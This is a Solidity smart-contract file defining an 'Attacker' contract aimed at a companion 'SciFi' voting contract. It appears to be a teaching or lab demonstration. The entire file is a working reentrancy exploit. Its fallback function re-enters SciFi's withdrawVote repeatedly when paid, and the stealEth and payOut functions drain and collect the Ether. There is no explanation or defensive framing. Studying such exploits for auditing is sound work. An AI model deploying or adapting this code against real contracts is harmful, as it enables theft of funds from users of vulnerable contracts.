pragma solidity ^0.4.13;

import "./SciFi.sol";

contract Attacker {

  address public scifiAddress;

  uint voteNo;
  uint public a = 0;

  function () payable {
    while (a<5) {
      a++;
      SciFi(scifiAddress).withdrawVote(voteNo);
    }
  }

  //fund contract without calling the default function
  function fundMe() payable {

  }

  function stealEth(){
    SciFi(scifiAddress).withdrawVote(voteNo);
    resetA();
  }

  function payOut() returns (bool){
    if (msg.sender.send(this.balance))
      return true;
  }

  function vote(bytes32 name, uint _amount){
    SciFi(scifiAddress).vote.value(_amount)(name);
    voteNo = SciFi(scifiAddress).numVotes();
  }

  function resetA() {
    a = 0;
  }

  function setSciFiAddress(address _scifi){
    scifiAddress = _scifi;
  }
}
